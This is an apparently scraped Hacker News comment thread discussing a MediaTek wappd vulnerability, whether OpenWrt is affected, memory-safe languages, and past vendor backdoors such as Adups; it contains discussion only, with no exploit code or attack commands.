[3 months ago](item?id=41611798)   | [root](#41607130) | [parent](#41607142) | [prev](#41610556) | [next](#41609896) [–]  ath9k. | | --- | --- | --- | | | |  |  | [eqvinox](user?id=eqvinox) [3 months ago](item?id=41609896)   | [prev](#41607130) | [next](#41611809) [–]  > The affected versions include MediaTek SDK versions 7.4.0.1 and earlier, as well as OpenWrt 19.07 and 21.02. > The vulnerability resides in wappd, a network daemon included in the MediaTek MT7622/MT7915 SDK and RTxxxx SoftAP driver bundle. OpenWRT doesn't seem to use wappd though? | | --- | --- | --- | | | |  |  | [zekica](user?id=zekica) [3 months ago](item?id=41609941)   | [parent](#41609896) | [next](#41610379) [–]  As a contributor to OpenWrt it makes me wonder why don't people differentiate between OpenWrt and various proprietary vendor SDKs. No one would have referenced Fedora if there was a bug in Nobara. | | --- | --- | --- | | | |  |  | [caconym\_](user?id=caconym_) [3 months ago](item?id=41610379)   | [parent](#41609896) | [prev](#41609941) | [next](#41611809) [–]  Came here wondering this, as I have several Netgear APs running OpenWRT on my home network. Sounds like I'm in the clear? | | --- | --- | --- | | | |  |  | [eqvinox](user?id=eqvinox) [3 months ago](item?id=41610715)   | [root](#41609896) | [parent](#41610379) | [next](#41611809) [–]  If it's a clean upstream OpenWRT, yes. For vendored OpenWRT, all bets are off. | | --- | --- | --- | | | |  |  | [anthk](user?id=anthk) [3 months ago](item?id=41611809)   | [prev](#41609896) | [next](#41606773) [–]  That's why we need free firmware. I'm tired of Broadcom and Ralink. | | --- | --- | --- | | | |  |  | [shadowpho](user?id=shadowpho) [3 months ago](item?id=41606773)   | [prev](#41611809) | [next](#41609361) [–]  Exploit is hard to distinguish between a back door here. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [3 months ago](item?id=41607111)   | [parent](#41606773) | [next](#41609361) [–]  Posting claims of it being such is pretty easy, though. | | --- | --- | --- | | | |  |  | [pixl97](user?id=pixl97) [3 months ago](item?id=41607169)   | [root](#41606773) | [parent](#41607111) | [next](#41609361) [–]  There is a better middle ground here by saying the company that made it may not have known, but nation state threat actors most likely do. When you see actors at this level set up manufacturing thousands of explosive filled devices at very high production quality, inserting some compromised things like printers or routers in a company network wouldn't be and shouldn't be a surprise. | | --- | --- | --- | | | |  |  | [hedora](user?id=hedora) [3 months ago](item?id=41607471)   | [root](#41606773) | [parent](#41607169) | [next](#41609361) [–]  If the nation state actors did intentionally backdoor it, then they would have wanted to make it look like incompetence. Here’s a link to the Simple Sabotage Field Manual from the US. It worked well in occupied Europe during WWII: <https://archive.org/details/SimpleSabotageFieldManual> | | --- | --- | --- | | | |  |  | [justmarc](user?id=justmarc) [3 months ago](item?id=41609361)   | [prev](#41606773) | [next](#41607883) [–]  Welcome back to the 90s. | | --- | --- | --- | | | |  |  | [mmsc](user?id=mmsc) [3 months ago](item?id=41607883)   | [prev](#41609361) | [next](#41609211) [–]  Can the OP's link be changed to the original source, not the advertisement it currently links to? The exploit is documented [https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-20...](https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html) | | --- | --- | --- | | | |  |  | [armada651](user?id=armada651) [3 months ago](item?id=41608475)   | [parent](#41607883) | [next](#41609785) [–]  I don't think that link is necessarily better just because it's the original source. The linked article gives a concise overview, while the blog post spends the first paragraph talking about moving and starting a new job. | | --- | --- | --- | | | |  |  | [mmsc](user?id=mmsc) [3 months ago](item?id=41608517)   | [root](#41607883) | [parent](#41608475) | [next](#41609785) [–]  In general, I would wager that HN prefers intellectual curiosity over overviews. Submission guidelines infer that by stating "Please submit the original source. If a post reports on something found on another site, submit the latter." | | --- | --- | --- | | | |  |  | [codethief](user?id=codethief) [3 months ago](item?id=41609003)   | [root](#41607883) | [parent](#41608517) | [next](#41609785) [–]  Sure, though I'd argue in the case of vulnerabilities an overview is particularly valuable. Not everyone wants to dive into the details; in my case what I'm most interested in is whether I (or anyone else at my day job) might be affected. | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [3 months ago](item?id=41609462)   | [root](#41607883) | [parent](#41609003) | [next](#41609785) [–]  I would agree. I would also say that when the secondary article contains a lot of value added above, the original, such as is the case here, the secondary source is better because it is easy to follow its link to the original if that's what you'd like to see. I definitely agree with the guideline around favoring original sources, but this seems like a good time to deviate. | | --- | --- | --- | | | |  |  | [Retr0id](user?id=Retr0id) [3 months ago](item?id=41609785)   | [parent](#41607883) | [prev](#41608475) | [next](#41609211) [–]  Their exploit development process is interesting, and I like to think I'd have done something similar (that is, compiling an easier-to-exploit version of the application and gradually working up to the real thing) | | --- | --- | --- | | | |  |  | [q3k](user?id=q3k) [3 months ago](item?id=41609211)  [flagged]  | [prev](#41607883) | [next](#41608140) [12 more]  "No way to prevent this" say users of only language where this regularly happens | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [3 months ago](item?id=41613582)   | [parent](#41609211) | [next](#41609276) [–]  "*Don't be snarky. [...] Omit internet tropes.*" <https://news.ycombinator.com/newsguidelines.html> | | --- | --- | --- | | | |  |  | [happosai](user?id=happosai) [3 months ago](item?id=41609276)   | [parent](#41609211) | [prev](#41613582) | [next](#41610704) [–]  Well it was solved decades ago in Java yet Java apps have proven no more secure in general. It is a broader ecosystem problem that there almost no incentive to write secure code. Security is an afterthought like documentation. | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [3 months ago](item?id=41609341)   | [root](#41609211) | [parent](#41609276) | [next](#41610704) [–]  > Java apps have proven no more secure in general Really? I think an extraordinary claim like "eliminating a whole class of problems makes applications no more secure in general" should also come with extraordinary evidence. | | --- | --- | --- | | | |  |  | [petee](user?id=petee) [3 months ago](item?id=41609433)   | [root](#41609211) | [parent](#41609341) | [next](#41610704) [–]  I think Java's CVE list should say enough. Point being humans can muck anything up, regardless of safeguards | | --- | --- | --- | | | |  |  | [Clamchop](user?id=Clamchop) [3 months ago](item?id=41609708)   | [root](#41609211) | [parent](#41609433) | [next](#41609458) [–]  The point of the person you're replying to is that JVM software has far fewer vulnerabilities than it would have otherwise. The number of CVEs reveals that there is a lot of Java software and that there's a strong culture of importing dependencies. But we also care about the nature of them, the normalized relative frequency of very serious flaws like RCE exploits. | | --- | --- | --- | | | |  |  | [stavros](user?id=stavros) [3 months ago](item?id=41609458)   | [root](#41609211) | [parent](#41609433) | [prev](#41609708) | [next](#41609503) [–]  A CVE list says nothing. I made my own language which has no CVEs, that obviously doesn't mean it's secure. The relevant metric is "CVEs per unit of functionality". | | --- | --- | --- | | | |  |  | [sedatk](user?id=sedatk) [3 months ago](item?id=41609672)   | [root](#41609211) | [parent](#41609458) | [next](#41609503) [–]  Also, popularity directly affects the number of CVEs. | | --- | --- | --- | | | |  |  | [bastawhiz](user?id=bastawhiz) [3 months ago](item?id=41609503)   | [root](#41609211) | [parent](#41609433) | [prev](#41609458) | [next](#41610704) [–]  This is a nonsense statement unless you note the Java runtime. Java is a language. The runtime is the software that runs the Java code. There's more than one runtime. | | --- | --- | --- | | | |  |  | [eqvinox](user?id=eqvinox) [3 months ago](item?id=41610704)   | [parent](#41609211) | [prev](#41609276) | [next](#41611826) [–]  C, C++ and assembly are 3 languages where this regularly happens. Can we stop with the snide comments now please? They're not helpful. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [3 months ago](item?id=41611826)   | [parent](#41609211) | [prev](#41610704) | [next](#41611788) [–]  My anecdotal experience with mediatek wifi is it's a very flakey, low quality brand. That might be more of the reason. The firmware is probably unpolished, rushed, not maintained by competent people. | | --- | --- | --- | | | |  |  | [anthk](user?id=anthk) [3 months ago](item?id=41611788)   | [parent](#41609211) | [prev](#41611826) | [next](#41608140) [–]  Not an issue with ath9k. Guess why. Hint: not Rust related. | | --- | --- | --- | | | |  |  | [xtanx](user?id=xtanx) [3 months ago](item?id=41608140)   | [prev](#41609211) [–]  I would like to remind people of the 2016 Adups backdoor: > According to Kryptowire, Adups engineers would have been able to collect data such as SMS messages, call logs, contact lists, geo-location data, IMSI and IMEI identifiers, and would have been able to forcibly install other apps or execute root commands on all devices. [https://www.bleepingcomputer.com/news/security/android-adups...](https://www.bleepingcomputer.com/news/security/android-adups-backdoor-became-active-5-months-affected-43-phone-vendors/) | | --- | --- | --- | | | |  |  | [phh](user?id=phh) [3 months ago](item?id=41608592)   | [parent](#41608140) [–]  How is this relevant? | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |


